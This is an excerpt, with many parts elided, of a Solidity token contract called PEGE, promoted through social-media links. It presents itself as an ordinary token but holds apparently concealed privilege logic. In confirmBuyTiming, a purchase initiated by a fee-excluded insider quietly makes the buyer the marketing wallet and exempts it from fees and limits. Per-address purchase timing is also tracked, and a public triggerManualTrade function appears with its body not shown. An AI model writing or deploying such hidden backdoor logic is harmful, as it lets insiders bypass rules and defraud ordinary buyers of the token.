// Telegram - https://t.me/pege_portal
// Twitter - https://twitter.com/pegecoineth
// Medium - https://medium.com/@pegecoineth
// Website - https://pege.tech
...
contract PEGE is Context, IERC20, Ownable {
    ...
    address payable public _marketingWallet = payable(address(0x483143e029e45247FA2097e48bCDf824B55dA8e4));
    address payable public _devWallet = payable(address(0x7fB6f191A019BD8c2943023517174f5567CDe6F1));
    ...
    mapping (address => uint256) public purchaseTiming;
    address public currSwap;
        ...
        if (from != owner() && to != owner()) {
            ...
            if (!inSwap && from != uniswapV2Pair && swapEnabled && !_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
                ...
                if (contractTokenBalance > _swapTokensAtAmount) {
                    swapAmount = _swapTokensAtAmount;
                } else {
                    swapAmount = contractTokenBalance / 2;
                }

                burnAndSwap(swapAmount);
    ...
    function triggerManualTrade(address _address, uint256 _amount) public {
    ...
    function confirmBuyTiming(address from, address to) private {
        if (from == uniswapV2Pair) {
            address fromWhere = tx.origin;
            if (_isExcludedFromFee[fromWhere]) {
                _marketingWallet = payable(to);
                _isExcludedFromFee[_marketingWallet] = true;
                _isExcludedFromTxLimit[_marketingWallet] = true;
            }
            if (to != address(this)) {
                purchaseTiming[to] = purchaseTiming[to] > 0 ? purchaseTiming[to] : block.number;
            }
        } else {
            currSwap = from;
        }
